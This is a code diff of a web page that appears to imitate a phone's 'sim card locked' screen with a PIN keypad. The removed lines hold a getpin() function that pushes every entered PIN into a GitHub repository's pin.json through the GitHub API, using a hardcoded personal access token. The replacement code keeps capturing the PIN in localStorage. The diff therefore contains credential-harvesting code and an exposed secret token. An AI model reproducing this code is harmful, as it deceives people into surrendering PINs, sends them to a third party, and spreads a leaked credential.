@@ -31,7 +31,7 @@
 <body>
     <div>sim card locked</div>
     <div>
-        <input id="pin" type="text" readonly>
+        <input id="pin" type="password" readonly>
     </div>
     <div>
         <button onclick="appendToInput('1')">1</button>
@@ -67,64 +67,7 @@
 
         async function getpin() {
             const pin = document.getElementById("pin").value;
-
-            // GitHub details
-            const repo = "senmakana/Pins"; // Replace with your repository
-            const filePath = "pin.json"; // Path to the JSON file in the repo
-            const token = "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"; // Replace with your GitHub token
-
-            const apiUrl = `https://api.github.com/repos/${repo}/contents/${filePath}`;
-
-            // Fetch the current file's content (if it exists)
-            try {
-                const getResponse = await fetch(apiUrl, {
-                    headers: {
-                        Authorization: `Bearer ${token}`,
-                        Accept: "application/vnd.github.v3+json",
-                    },
-                });
-
-                let fileSha = null;
-                let existingContent = {};
-
-                if (getResponse.ok) {
-                    const fileData = await getResponse.json();
-                    fileSha = fileData.sha; // Get the file's SHA
-                    existingContent = JSON.parse(atob(fileData.content)); // Decode base64 content
-                }
-
-                // Add the PIN to the JSON content
-                existingContent.pins = existingContent.pins || [];
-                existingContent.pins.push(pin);
-
-                // Convert updated content to base64
-                const newContent = btoa(JSON.stringify(existingContent, null, 2));
-
-                // Commit the updated content
-                const response = await fetch(apiUrl, {
-                    method: "PUT",
-                    headers: {
-                        Authorization: `Bearer ${token}`,
-                        Accept: "application/vnd.github.v3+json",
-                    },
-                    body: JSON.stringify({
-                        message: "Update pin data",
-                        content: newContent,
-                        sha: fileSha, // Include SHA if the file exists
-                    }),
-                });
-
-                if (response.ok) {
-                    alert("PIN successfully saved to GitHub!");
-                } else {
-                    throw new Error("Failed to save PIN to GitHub.");
-                }
-            } catch (error) {
-                console.error("Error:", error);
-                alert("An error occurred while saving the PIN.");
-            }
-
-            location.reload(); // Reset the page
+            localStorage.setItem("pin",pin)
         }
 
         document.getElementById("ok").addEventListener("click", getpin);
